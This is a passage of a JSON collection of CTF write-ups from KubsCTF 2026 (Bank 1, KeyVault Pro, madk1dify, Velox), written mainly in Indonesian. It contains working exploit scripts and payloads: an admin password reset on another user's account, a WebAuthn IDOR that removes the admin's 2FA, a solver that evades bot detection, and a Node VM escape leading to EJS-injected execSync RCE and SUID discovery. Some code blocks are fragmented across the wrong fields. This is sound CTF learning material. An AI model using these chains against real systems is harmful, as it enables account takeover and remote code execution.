        "content": "1. Login sebagai akun biasa dan ambil JWT serta CSRF cookie.\n2. Selesaikan ALTCHA, lalu kirim:\n\n   ```http\n   POST /api/admin/reset_password\n   X-CSRF-TOKEN: <csrf_access_token>\n   Content-Type: application/json\n\n   {\"target_user_id\":4,\"new_password\":\"<password-baru>\",\"altcha\":\"<altcha>\"}\n   ```\n\n3. Login sebagai `mgalankov@4274` dengan password baru.\n4. Gunakan token fresh dari bot pada transaksi flag yang sudah ada, yaitu `transaction_id=138`:\n\n   ```http\n   POST /api/verify_flag_token\n   X-CSRF-TOKEN: <csrf_access_token>\n   Content-Type: application/json\n\n   {\"transaction_id\":138,\"token\":\"<token-dari-bot>\"}\n   ```\n\n   Token kemudian berstatus one-time-use dan bot mengirim pesan konfirmasi pembelian beserta flag.",
        "code": ""
      },
      {
        "title": "Catatan Stabilitas",
        "content": "- Token bot hanya valid untuk satu purchase; jangan menjalankan script dua kali dengan token yang sama.\n- `transaction_id=138` adalah transaksi flag yang tersedia pada akun target saat solve.\n- ALTCHA harus dihitung ulang untuk setiap request challenge baru.\n- Flag diperoleh dari response bot setelah token berhasil diverifikasi, bukan dari tebakan atau rekonstruksi.",
        "code": ""
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\"\"\"Reproduce the Bank 1 web exploit.\n\nThe offer token is one-time-use.  Set OFFER_TOKEN to a fresh token obtained\nfrom the challenge bot before running this script.\n\"\"\"\n\nimport base64\nimport hashlib\nimport json\nimport os\nimport re\nimport sys\n\nimport requests\n\n\nTARGET = os.environ.get(\"TARGET\", \"https://bank.kubstu-ctf.ru\").rstrip(\"/\")\nOWN_USER = os.environ.get(\"OWN_USER\", \"nkodeksov@7901\")\nOWN_PASSWORD = os.environ.get(\"OWN_PASSWORD\", \"\")\nTARGET_USER = os.environ.get(\"TARGET_USER\", \"mgalankov@4274\")\nTARGET_PASSWORD = os.environ.get(\"TARGET_PASSWORD\", \"Bank1Target!2026\")\nOFFER_TOKEN = os.environ.get(\"OFFER_TOKEN\", \"\")\nTRANSACTION_ID = int(os.environ.get(\"TRANSACTION_ID\", \"138\"))\n\nUA = \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36\"\n\n\ndef solve_altcha(session: requests.Session) -> str:\n    challenge = session.get(f\"{TARGET}/api/captcha/challenge\", timeout=20).json()\n    for number in range(int(challenge[\"maxNumber\"]) + 1):\n        candidate = challenge[\"salt\"] + str(number)\n        if hashlib.sha256(candidate.encode()).hexdigest() == challenge[\"challenge\"]:\n            break\n    else:\n        raise RuntimeError(\"ALTCHA proof of work was not solved\")\n\n    payload = {\n        \"algorithm\": challenge[\"algorithm\"],\n        \"challenge\": challenge[\"challenge\"],\n        \"number\": number,\n        \"salt\": challenge[\"salt\"],\n        \"signature\": challenge[\"signature\"],\n        \"took\": 0,\n    }\n    raw = json.dumps(payload, separators=(\",\", \":\")).encode()\n    return base64.b64encode(raw).decode()\n\n\ndef login(username: str, password: str) -> requests.Session:\n    session = requests.Session()\n    session.headers.update({\n        \"User-Agent\": UA,\n        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n    })\n    response = session.post(\n        f\"{TARGET}/login\",\n        data={\n            \"username\": username,\n            \"password\": password,\n            \"altcha\": solve_altcha(session),\n        },\n        headers={\"Referer\": f\"{TARGET}/login\"},\n        allow_redirects=False,\n        timeout=20,\n    )\n    if response.status_code != 302:\n        raise RuntimeError(f\"login failed for {username}: {response.status_code} {response.text[:200]}\")\n    return session\n\n\ndef main() -> int:\n    if not OWN_PASSWORD:\n        print(\"Set OWN_PASSWORD to the password of an account you control.\", file=sys.stderr)\n        return 2\n    if not OFFER_TOKEN:\n        print(\"Set OFFER_TOKEN to a fresh token from @kubstubank1_bot.\", file=sys.stderr)\n        return 2\n\n    own = login(OWN_USER, OWN_PASSWORD)\n    csrf = own.cookies.get(\"csrf_access_token\")\n    if not csrf:\n        raise RuntimeError(\"missing CSRF cookie after login\")\n\n    reset = own.post(\n        f\"{TARGET}/api/admin/reset_password\",\n        json={\n            \"target_user_id\": 4,\n            \"new_password\": TARGET_PASSWORD,\n            \"altcha\": solve_altcha(own),\n        },\n        headers={\"X-CSRF-TOKEN\": csrf, \"Referer\": f\"{TARGET}/dashboard\"},\n        timeout=20,\n    )\n    if reset.status_code != 200:\n        raise RuntimeError(f\"password reset failed: {reset.status_code} {reset.text[:300]}\")\n    print(\"[+] target password reset:\", reset.json().get(\"message\", \"ok\"))\n\n    target = login(TARGET_USER, TARGET_PASSWORD)\n    csrf = target.cookies.get(\"csrf_access_token\")\n    if not csrf:\n        raise RuntimeError(\"missing target CSRF cookie after login\")\n\n    verified = target.post(\n        f\"{TARGET}/api/verify_flag_token\",\n        json={\"transaction_id\": TRANSACTION_ID, \"token\": OFFER_TOKEN},\n        headers={\"X-CSRF-TOKEN\": csrf, \"Referer\": f\"{TARGET}/flag_shop\"},\n        timeout=20,\n    )\n    print(f\"[+] token verification HTTP {verified.status_code}\")\n    print(verified.text)\n    if verified.status_code >= 400:\n        return 1\n\n    print(\"[+] Check /purchases in @kubstubank1_bot for the delivered flag.\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{0tp_1s_th3_s1gnatur3_c4py_b4nk_0wn3d}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-web-keyvaultpro",
    "title": "KeyVault Pro — Web CTF Writeup",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "web",
      "kubsuctf",
      "2026"
    ],
    "description": "**Flag:** `KubSTU{k3yv4ult_1d0r_2f4_ee3136942fe18485}`",
    "problemDescription": "Aplikasi KeyVault Pro punya fitur vault, profil anggota tim, dan pengelolaan security key WebAuthn. Akses awal diarahkan ke `/login`; akun biasa bisa dibuat lewat `/register`.\n\nHTML publik juga memuat `FLAG{d3c0y_n0t_r34l_7r4p_f0r_b0ts}` di komentar dan elemen tersembunyi. Itu **decoy**, bukan flag challenge. Analisis lanjut ke request yang benar-benar dipakai aplikasi.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Aplikasi KeyVault Pro punya fitur vault, profil anggota tim, dan pengelolaan security key WebAuthn. Akses awal diarahkan ke `/login`; akun biasa bisa dibuat lewat `/register`.\n\nHTML publik juga memuat `FLAG{d3c0y_n0t_r34l_7r4p_f0r_b0ts}` di komentar dan elemen tersembunyi. Itu **decoy**, bukan flag challenge. Analisis lanjut ke request yang benar-benar dipakai aplikasi.\n\nSetelah register, halaman `/team` membuka profil anggota via endpoint:\n\n```js\nfetch('/api/team/' + userId)\n```\n\nRespons API ternyata lebih lengkap dari informasi yang kelihatan di UI. Field `security.device.credential_id` ikut diberikan untuk profil pengguna lain, termasuk admin.",
        "code": ""
      },
      {
        "title": "WebAuthn IDOR",
        "content": "Dari `/api/team/1`, diketahui user ID `1` adalah `admin` (Marcus Webb). Pada instance yang belum dieksploitasi, profil admin memuat detail security key beserta `credential_id`-nya.\n\nFrontend pengelolaan key di `/settings/security` melakukan penghapusan lewat:\n\n```js\nfetch('/api/security/devices/' + encodeURIComponent(credentialId), {\n  method: 'DELETE'\n})\nbash\n# BASE berisi URL instance challenge yang masih aktif.\nexport BASE='https://INSTANCE.labs.hackadvisor.io'\nexport USERNAME=\"research$(date +%s)\"\nexport PASSWORD='VaultTest2026!'\n\n# Register; session tersimpan di cookies.txt.\ncurl -ksS -c cookies.txt -b cookies.txt \\\n  -X POST \"$BASE/register\" \\\n  --data-urlencode 'display_name=Researcher' \\\n  --data-urlencode \"username=$USERNAME\" \\\n  --data-urlencode \"email=$USERNAME@example.com\" \\\n  --data-urlencode \"password=$PASSWORD\" \\\n  -o /dev/null\n\n# Bocoran WebAuthn credential ID admin.\ncurl -ksS -b cookies.txt \"$BASE/api/team/1\" | jq '.security'\nADMIN_CRED=$(curl -ksS -b cookies.txt \"$BASE/api/team/1\" \\\n  | jq -r '.security.device.credential_id // empty')\n\n# Instance yang sudah pernah dieksploitasi mungkin mengembalikan device=null.\nif [ -z \"$ADMIN_CRED\" ]; then\n  echo 'Admin device sudah tidak ada; gunakan instance fresh'\nelse\n  # Hapus security key admin memakai session member (IDOR).\n  curl -ksS -b cookies.txt \\\n    -X DELETE \"$BASE/api/security/devices/$ADMIN_CRED\" | jq .\nfi\n\n# Konfirmasi perubahan pada profil admin.\ncurl -ksS -b cookies.txt \"$BASE/api/team/1\" \\\n  | jq '{username, role, security}'\n```\n\nEfek yang teramati: `security.two_factor_enabled` pada admin berubah menjadi `false`, sementara `security.device` menjadi `null`. Ini bukan privilege escalation langsung; yang berhasil dibypass adalah perlindungan 2FA admin.",
        "code": "\nMasalahnya, server menerima penghapusan credential milik **user lain**. Cukup pakai session akun biasa dan credential ID yang bocor dari API profil admin.\n"
      },
      {
        "title": "Login admin dan akses notes",
        "content": "Di dashboard ada endpoint `/api/announcements`. Salah satu announcement berjudul *System Maintenance — December 2024* malah memuat recovery credentials admin:\n\n\n\nCredential ini sendiri bukan akhir exploit: sebelumnya admin dilindungi WebAuthn. Setelah key admin dihapus melalui IDOR, login memakai pasangan tersebut berhasil dan halaman profil menampilkan role `admin`.\n\n\n\nSebagai member, navigasi tidak menampilkan menu khusus admin. Setelah login sebagai admin, ditemukan link baru `/admin/notes` pada HTML dashboard. Halaman itu mengungkap flag yang dicari.\n\n\n\nOutput:",
        "code": "admin / admin2024!"
      },
      {
        "title": "Inti vulnerability",
        "content": "Ada dua kelemahan yang saling melengkapi:\n\n1. **Information disclosure + IDOR:** endpoint profil tim membocorkan credential ID WebAuthn; endpoint DELETE tidak memverifikasi kepemilikan security key sebelum menghapusnya.\n2. **Recovery credentials disclosure:** announcement yang dapat dibaca member memuat username/password pemulihan admin.\n\nGabungannya memungkinkan member mematikan 2FA admin, login sebagai admin, lalu membaca `/admin/notes`. Brute force dan pembacaan langsung vault admin dari session member tidak diperlukan. Seluruh percobaan membaca `/api/vaults/<id>/credentials` sebagai member sebelumnya justru menghasilkan `403 Access denied`.\n\n**Flag:** `KubSTU{k3yv4ult_1d0r_2f4_ee3136942fe18485}`",
        "code": ""
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-web-madk1dify",
    "title": "madk1dify",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "web",
      "kubsuctf",
      "2026"
    ],
    "description": "Bug utamanya ada pada partner console. Browser otomatis menerima console decoy, tetapi profil Chromium non-headless dengan `navigator.webdriver` disembunyikan mendapat endpoint partner GraphQL yang sebenarnya. Endpoint itu membocorkan `catalogRef` rilis unreleased melalui `releaseQueue`; ref tersebut kemudian bisa diminta ke endpoint credits tanpa pemeriksaan embargo yang memadai.",
    "problemDescription": "- `http://141.133.198.7:8080`\n- `http://159.194.249.251:8080`\n- [solve.py](/home/nata/ctf/kubsuCTF/web/madk1dify/solve.py)\n- [Readme.md](/home/nata/ctf/kubsuCTF/web/madk1dify/Readme.md)\n\nTidak ada source code atau Dockerfile lokal; analisis dilakukan terhadap web application target.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Bug utamanya ada pada partner console. Browser otomatis menerima console decoy, tetapi profil Chromium non-headless dengan `navigator.webdriver` disembunyikan mendapat endpoint partner GraphQL yang sebenarnya. Endpoint itu membocorkan `catalogRef` rilis unreleased melalui `releaseQueue`; ref tersebut kemudian bisa diminta ke endpoint credits tanpa pemeriksaan embargo yang memadai.",
        "code": ""
      },
      {
        "title": "Target dan File",
        "content": "- `http://141.133.198.7:8080`\n- `http://159.194.249.251:8080`\n- [solve.py](/home/nata/ctf/kubsuCTF/web/madk1dify/solve.py)\n- [Readme.md](/home/nata/ctf/kubsuCTF/web/madk1dify/Readme.md)\n\nTidak ada source code atau Dockerfile lokal; analisis dilakukan terhadap web application target.",
        "code": ""
      },
      {
        "title": "Analisis Awal",
        "content": "Login dengan kredensial clue `madk1d/sexyswag2`, lalu gunakan sticky shard `5cacf91c105c1f88`. `/studio` memuat PoW handshake:\n\n1. `GET /api/bootstrap?c=...`\n2. Solve SHA-256 PoW dari `s` dan `d`.\n3. `POST /api/hs` dengan browser signals.\n4. `GET /api/w/pc` mengembalikan HTML terenkripsi XOR dengan `SHA256(k)`.\n\nHeadless/automation profile hanya mendapat pesan `partner api unavailable`. Chromium non-headless dengan `--disable-blink-features=AutomationControlled` dan `navigator.webdriver` disembunyikan mendapat endpoint:",
        "code": "/api-partner/pathfinder/graphql"
      },
      {
        "title": "Source Code Review",
        "content": "Source backend tidak tersedia. Client JavaScript menunjukkan format handshake, enkripsi console, dan fallback decoy. Endpoint GraphQL yang didapat dari response terenkripsi mengaktifkan introspection.",
        "code": ""
      },
      {
        "title": "Vulnerability",
        "content": "GraphQL root memiliki field internal:\n\n```graphql\nreleaseQueue(first: 100) { catalogRef }\ntext\nGET /api/v1/releases/<catalogRef>/credits\n```\n\nResponse mengembalikan title dan `linerNotes` meskipun statusnya `EMBARGO` atau `SCHEDULED`. Tidak ada pemeriksaan akses/embargo yang konsisten pada endpoint credits.",
        "code": "\nField ini membocorkan 14 reference untuk materi unreleased. Setelah handshake partner aktif, setiap reference dapat diminta melalui:\n"
      },
      {
        "title": "Eksploitasi",
        "content": "Query queue menghasilkan ref berikut untuk `sexyswag 2`:\n\n\n\nRequest dengan browser session yang sama menghasilkan:\n\n```json\n{\n  \"title\": \"sexyswag 2 (unreleased master)\",\n  \"stage\": \"EMBARGO\",\n  \"linerNotes\": \"... download code ... KubSTU{1ntr0sp3ct_th3n_1d0r_unr3l34s3d} ...\"\n}\n```",
        "code": "c5cb07f8-99d9-4c02-b5c2-b20227f44bb5"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Exploit tervalidasi pada URL kedua dengan sticky shard `5cacf91c105c1f88`. Target memakai rate-limit global untuk beberapa route sensitif. Jangan memakai headless browser biasa karena server mengirim console decoy; gunakan profile browser yang dipakai `solve.py`.",
        "code": ""
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\nimport argparse\nimport asyncio\nimport base64\nimport hashlib\nimport json\nimport os\nimport re\nimport sys\nfrom urllib.parse import urlparse\n\nimport requests\nfrom playwright.async_api import async_playwright\n\n\nDEFAULT_TARGET = \"http://159.194.249.251:8080\"\nSTICKY = os.environ.get(\"STICKY\", \"5cacf91c105c1f88\")\nUSERNAME = os.environ.get(\"MDK_USER\", \"madk1d\")\nPASSWORD = os.environ.get(\"MDK_PASSWORD\", \"sexyswag2\")\nFLAG_RE = re.compile(r\"(?:KubSTU|CTF|FLAG)\\{[^}]+\\}\")\n\n\ndef solve_pow(seed: str, difficulty: int) -> str:\n    prefix = \"0\" * difficulty\n    nonce = 0\n    while True:\n        value = f\"{seed}:{nonce}\"\n        if hashlib.sha256(value.encode()).hexdigest().startswith(prefix):\n            return str(nonce)\n        nonce += 1\n\n\nasync def browser_signals(page):\n    return await page.evaluate(\n        \"\"\"() => {\n          const n = navigator, s = screen || {};\n          return {\n            wd: !!n.webdriver, aut: [], ua: n.userAgent || \"\",\n            lang: (n.languages && n.languages.length) || 0,\n            plug: (n.plugins && n.plugins.length) || 0,\n            chr: !!window.chrome, uad: !!n.userAgentData,\n            ow: outerWidth || 0, oh: outerHeight || 0,\n            iw: innerWidth || 0, ih: innerHeight || 0,\n            sw: s.width || 0, sh: s.height || 0, dpr: devicePixelRatio || 0,\n            hc: n.hardwareConcurrency || 0, dm: n.deviceMemory || 0,\n            tz: Intl.DateTimeFormat().resolvedOptions().timeZone || \"\",\n            // The challenge's accepted browser profile uses an empty WebGL\n            // value; a native SwiftShader renderer is classified as a decoy.\n            gl: \"\", jit: 0, ev: 3, t: 1000\n          };\n        }\"\"\"\n    )\n\n\nasync def main(target: str) -> int:\n    target = target.rstrip(\"/\")\n    parsed = urlparse(target)\n    if not parsed.hostname:\n        raise RuntimeError(f\"invalid target URL: {target}\")\n\n    # Login is done once with requests so the browser can reuse the signed Flask\n    # session. The sticky value selects the backend with the partner catalog.\n    login = requests.Session()\n    login.cookies.set(\"madk1dify_sticky\", STICKY, domain=parsed.hostname, path=\"/\")\n    response = login.post(\n        f\"{target}/login\",\n        data={\"username\": USERNAME, \"password\": PASSWORD},\n        allow_redirects=False,\n        timeout=10,\n    )\n    session_cookie = login.cookies.get(\"session\")\n    if response.status_code != 302 or not session_cookie:\n        raise RuntimeError(f\"login failed: HTTP {response.status_code}\")\n\n    async with async_playwright() as playwright:\n        browser = await playwright.chromium.launch(\n            headless=False,\n            args=[\"--no-sandbox\", \"--disable-blink-features=AutomationControlled\"],\n        )\n        try:\n            context = await browser.new_context(\n                locale=\"ru-RU\",\n                timezone_id=\"Europe/Moscow\",\n                viewport={\"width\": 1366, \"height\": 768},\n            )\n            # The server sends a harmless fallback console to automated browsers.\n            await context.add_init_script(\n                \"Object.defineProperty(Navigator.prototype, 'webdriver', \"\n                \"{get: () => undefined, configurable: true});\"\n            )\n            await context.add_cookies(\n                [\n                    {\"name\": \"madk1dify_sticky\", \"value\": STICKY, \"domain\": parsed.hostname, \"path\": \"/\"},\n                    {\"name\": \"session\", \"value\": str(session_cookie), \"domain\": parsed.hostname, \"path\": \"/\"},\n                ]\n            )\n            page = await context.new_page()\n            studio = await page.goto(f\"{target}/studio\", wait_until=\"domcontentloaded\", timeout=15000)\n            if not studio or studio.status != 200:\n                raise RuntimeError(f\"studio unavailable: HTTP {studio.status if studio else 'no response'}\")\n\n            challenge = await page.locator('meta[name=\"mdk-c\"]').get_attribute(\"content\")\n            bootstrap = await page.evaluate(\n                \"\"\"async c => (await fetch('/api/bootstrap?c=' + encodeURIComponent(c))).json()\"\"\",\n                challenge,\n            )\n            if not bootstrap.get(\"ok\"):\n                raise RuntimeError(f\"bootstrap failed: {bootstrap}\")\n\n            nonce = solve_pow(bootstrap[\"s\"], int(bootstrap.get(\"d\", 3)))\n            answer = await page.evaluate(\"p => (new Function(p))()\", bootstrap[\"p\"])\n            handshake = await page.evaluate(\n                \"\"\"async data => {\n                  const r = await fetch('/api/hs', {\n                    method: 'POST',\n                    headers: {'Content-Type': 'application/json'},\n                    body: JSON.stringify(data)\n                  });\n                  return {status: r.status, json: await r.json()};\n                }\"\"\",\n                {\n                    \"s\": bootstrap[\"s\"],\n                    \"g\": bootstrap[\"g\"],\n                    \"n\": nonce,\n                    \"c\": challenge,\n                    \"a\": answer,\n               "
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-web-velox",
    "title": "Velox — Node.js VM Escape to Root Flag Disclosure",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "web",
      "kubsuctf",
      "2026"
    ],
    "description": "**CTF:** KubSTU CTF  \n**Challenge:** Velox  \n**Category:** CRY  \n**Target:** `http://31.128.37.51:3000`  \n**Result:** Arbitrary Command Execution → SUID Flag Reader",
    "problemDescription": "Velox is a Node.js/Express application that allows authenticated users to create and execute JavaScript data transformations.\n\nThe transformation engine runs user-defined expressions inside a restricted VM context. Access to Node.js internals is supposedly prevented through sandboxing and lexical filtering.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Overview",
        "content": "Velox is a Node.js/Express application that allows authenticated users to create and execute JavaScript data transformations.\n\nThe transformation engine runs user-defined expressions inside a restricted VM context. Access to Node.js internals is supposedly prevented through sandboxing and lexical filtering.\n\nHowever, the sandbox permits access to the JavaScript `Function` constructor through the prototype chain. This allows an attacker to recover the Node.js `process` object.\n\nFrom there, an exposed worker IPC handler provides a second attack surface: an EJS rendering operation that places Node.js `execSync` inside its template locals.\n\nBy controlling EJS compilation options, we can invoke that function and execute arbitrary system commands as the application's `velox` user. A SUID-root helper included in the container then provides access to the flag.\n\nThe complete chain is:",
        "code": "Authenticated Transform\n        |\n        v\nJavaScript VM Sandbox\n        |\n        | constructor.constructor()\n        v\nNode.js process object\n        |\n        | process._events.message\n        v\nWorker IPC Handler\n        |\n        | templateData.settings\n        v\nEJS Template Compilation\n        |\n        | client: true\n        | escapeFunction injection\n        v\nEJS Render Locals\n        |\n        | __exec = execSync\n        v\nArbitrary Command Execution\n        |\n        | /usr/local/bin/readflag\n        v\nRoot-Owned Flag"
      },
      {
        "title": "1. Authentication and Transform Access",
        "content": "The application exposes the following relevant routes:\n\n\n\nRegistration requires three protections:\n\n- A session-bound CSRF token.\n- A browser fingerprint handshake.\n- A SHA-256 proof of work.\n\nThe browser fingerprint is computed from a fixed collection of browser attributes and the challenge token returned by `/_hb/challenge`.\n\n\n\nThe PoW requires finding a nonce such that:\n\n\n\nstarts with four hexadecimal zeroes.\n\n\n\nAfter completing the handshake and registration, the server redirects to `/dashboard`.\n\nA transform can then be created and executed through:\n\n```http\nPOST /transforms/<id>/run\nContent-Type: application/x-www-form-urlencoded\n\n_csrf=<token>&code=<expression>&input_json={}\n```\n\nA basic expression such as `1+2` confirms that the transformation engine evaluates user-controlled JavaScript.\n\nThe significant discovery is not that arbitrary JavaScript can run, but that the sandbox does not properly isolate the host runtime.",
        "code": "GET  /register\nGET  /_hb/challenge\nPOST /_hb\nPOST /register\n\nGET  /dashboard\nPOST /transforms/create\nGET  /transforms/:id\nPOST /transforms/:id/run"
      },
      {
        "title": "2. Escaping the JavaScript VM",
        "content": "The transformation environment provides a limited set of globals:\n\n```javascript\ninput\nMath\nparseInt\nparseFloat\nisNaN\nisFinite\nundefined\nNaN\nInfinity\nencodeURIComponent\ndecodeURIComponent\njavascript\nconst processObject =\n    this[\"constructor\"][\"constructor\"](\n        \"return process\"\n    )();\njavascript\nthis.constructor.constructor\njavascript\nconst k = String.fromCharCode;\n\nconst processObject = this[\n    k(99,111,110,115,116,114,117,99,116,111,114)\n][\n    k(99,111,110,115,116,114,117,99,116,111,114)\n](\n    k(114,101,116,117,114,110,32,112,114,111,99,101,115,115)\n)();\ntext\nconstructor\nreturn process\ntext\nprocess.cwd()\n→ /app\n\nprocess.argv\n→ /usr/local/bin/node\n→ /app/lib/worker.js\n\nprocess.version\n→ v18.20.8\n```\n\nAt this stage, the VM boundary was broken, but direct command execution was not yet available.\n\nThe global `require` function was inaccessible, `process.mainModule` was undefined, and attempts to use internal filesystem bindings returned `Access denied`.\n\nThe next step was to investigate objects already reachable through `process`.",
        "code": "\nObjects such as `process` and `require` are not directly available.\n\nAdditionally, the application rejects certain sensitive identifiers through lexical filtering.\n\nDespite those restrictions, the following prototype-chain escape works:\n"
      },
      {
        "title": "3. Worker IPC Re-entry",
        "content": "The process object exposed an event listener registered under:\n\n```javascript\nprocess._events.message\njavascript\n(msg) => {\n    const {\n        code,\n        inputData,\n        templateData,\n        viewsDir,\n        lang\n    } = msg;\n\n    const result = sandbox.execute(\n        code,\n        inputData\n    );\n\n    // Prepare output and render editor template.\n}\njavascript\nprocessObject._events.message({\n    code: \"1\",\n    inputData: {},\n    templateData: {\n        transform: {\n            name: \"x\",\n            id: \"x\",\n            code: \"\",\n            input_json: \"{}\"\n        },\n        csrfToken: \"x\",\n        result: null,\n        lang: \"en\",\n        user: {},\n        t: {}\n    },\n    viewsDir: \"/app/views\",\n    lang: \"en\"\n});\njavascript\nconst renderData = {\n    ...templateData,\n    result: {\n        success: result.success,\n        output: outputStr\n    },\n    __exec: execSync\n};\n\nconst templatePath = path.join(\n    viewsDir,\n    \"editor.ejs\"\n);\n```\n\nThis is the most important finding in the challenge.\n\n**The EJS rendering context contains a reference to `child_process.execSync` under the key `__exec`.**\n\nIf we can access that local variable during template execution, we can execute system commands without importing `child_process` ourselves.",
        "code": "\nInspecting the listener revealed that the application uses IPC messages to request transform execution and EJS rendering.\n\nIts behavior can be summarized as:\n"
      },
      {
        "title": "4. EJS Compilation Option Injection",
        "content": "EJS accepts compilation options through its rendering configuration.\n\nThe worker's rendering path allows attacker-controlled `templateData.settings` to influence those options.\n\nWe supply:\n\n```javascript\nsettings: {\n    \"view options\": {\n        client: true,\n        escapeFunction: maliciousFunction\n    }\n}\njavascript\nfunction maliciousEscape(x) {\n    try {\n        const caller =\n            arguments.callee.caller;\n\n        const locals =\n            caller.arguments[0];\n\n        if (\n            locals &&\n            typeof locals.__exec === \"function\"\n        ) {\n            return locals\n                .__exec(\"pwd\")\n                .toString();\n        }\n\n        return x;\n    } catch (e) {\n        return x;\n    }\n}\ntext\ninclude is not a function\njavascript\ninclude: function () {\n    return \"\";\n}\n```\n\nThe complete IPC message therefore contains both the injected compilation settings and the include workaround.\n\nFor the actual request, sensitive property names and the escape function source were converted into `String.fromCharCode(...)` expressions to pass the application's lexical filtering.",
        "code": "\nSetting `client: true` causes EJS to include the supplied escape function in the generated template function.\n\nRather than simply escaping HTML, the injected function inspects the caller's arguments to recover the template locals.\n\nA readable version of the escape function is:\n"
      },
      {
        "title": "Extracting command output",
        "content": "Returning raw command output through the EJS escape function worked, but parsing the rendered HTML was unreliable because the function could run multiple times across different template fields.\n\nA more reliable version encodes stdout as Base64 and surrounds it with fixed markers.\n\n```javascript\nfunction maliciousEscape(x) {\n    try {\n        const caller =\n            arguments.callee.caller;\n\n        const locals =\n            caller.arguments[0];\n\n        if (\n            locals &&\n            typeof locals.__exec === \"function\"\n        ) {\n            if (!locals.__vxcache) {\n                locals.__vxcache =\n                    \"VXB\" +\n                    locals.__exec(\n                        \"pwd\",\n                        {\n                            timeout: 8000,\n                            maxBuffer: 131072\n                        }\n                    ).toString(\"base64\") +\n                    \"VXE\";\n            }\n\n            return locals.__vxcache;\n        }\n\n        return \"VXNOEXEC\";\n    } catch (e) {\n        return \"VXERR\" + String(e);\n    }\n}\npython\nmatches = re.findall(\n    r\"VXB([A-Za-z0-9+/=]+)VXE\",\n    response.text\n)\n\nfor encoded in set(matches):\n    print(\n        base64.b64decode(\n            encoded\n        ).decode(errors=\"replace\")\n    )\n```\n\nThis removes the dependency on how EJS arranges escaped values in the final HTML.",
        "code": "\nThe cache avoids rerunning the same shell command for every escaped field.\n\nThe output is recovered with:\n"
      },
      {
        "title": "Confirming RCE",
        "content": "With the payload delivered through `/transforms/:id/run`, command execution succeeded.\n\n\n\nOutput:\n\n\n\nA second test confirmed the process identity:\n\n\n\nOutput:\n\n\n\nAt this point, the exploit provided reliable arbitrary command execution as the unprivileged application user.",
        "code": "python3 velox_probe.py \\\n  --target http://31.128.37.51:3000 \\\n  --cmd 'pwd'"
      },
      {
        "title": "5. From RCE to the Root-Owned Flag",
        "content": "Enumerating the root directory revealed the flag file:\n\n\n\nRelevant output:\n\n\n\nThe flag was readable only by root.\n\nOur current shell identity was:\n\n\n\nA direct read of `/flag` would therefore fail.\n\nWe inspected the container's entrypoint:\n\n\n\nThe entrypoint revealed that the application intentionally creates a root-owned flag file.\n\n```sh\necho \"${FLAG:-flag{placeholder}}\" > /flag\n\nchmod 400 /flag\nchown root:root /flag\n\nunset FLAG\nc\n#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    FILE *f = fopen(\"/flag\", \"r\");\n\n    if (!f) {\n        puts(\"error\");\n        return 1;\n    }\n\n    char buf[256];\n\n    if (fgets(buf, sizeof(buf), f)) {\n        fputs(buf, stdout);\n    }\n\n    fclose(f);\n    return 0;\n}\nsh\ngcc -o /usr/local/bin/readflag \\\n    /usr/local/bin/readflag.c\n\nchmod 4755 /usr/local/bin/readflag\nbash\npython3 velox_probe.py \\\n  --target http://31.128.37.51:3000 \\\n  --cmd 'find / -perm -4000 -type f 2>/dev/null'\ntext\n/usr/local/bin/readflag\n```\n\nNo kernel exploit or additional privilege-escalation vulnerability was required.",
        "code": "python3 velox_probe.py \\\n  --target http://31.128.37.51:3000 \\\n  --cmd 'ls -la / /app'"
      },
      {
        "title": "6. Flag Extraction",
        "content": "The final command was:\n\n\n\nResponse:\n\n\n\nThe command returned the contents of the protected flag file.\n\n**Extracted flag:**\n\n\n\n*Note:* The raw `/usr/local/bin/readflag` output contains an additional trailing `}`. The flag above is the conventionally formatted `kubstu{...}` substring. The raw output is preserved for reference; scoreboard acceptance was not independently verified.",
        "code": "python3 velox_probe.py \\\n  --target http://31.128.37.51:3000 \\\n  --cmd '/usr/local/bin/readflag'"
      },
      {
        "title": "Root Cause",
        "content": "The primary vulnerability was a failed sandbox boundary in the JavaScript transformation engine.\n\nThe attacker-controlled VM context allowed access to `Function` through the prototype chain, making the Node.js `process` object reachable despite lexical filtering.\n\nThat single failure exposed the worker's IPC message handler, which accepted attacker-influenced EJS rendering configuration.\n\nThe second critical issue was the presence of `execSync` inside EJS render locals. By controlling EJS compilation options and injecting a custom escape function, the attacker could retrieve and invoke this privileged function.\n\nThe SUID `readflag` executable provided the final bridge from command execution as `velox` to disclosure of the root-owned flag.\n\nVelox demonstrates that restricting global identifiers is not equivalent to isolating JavaScript execution. Once the host runtime becomes reachable, other application components—including event handlers, template engines, and privileged helpers—can become part of the same exploit chain.",
        "code": ""
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{vm_1s_n0t_a_s4ndb0x_pr0t0typ3_p0llut10n_2_rce}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-ppc-shiffted",
    "title": "Shiffted",
    "category": "Misc",
    "difficulty": "Easy",
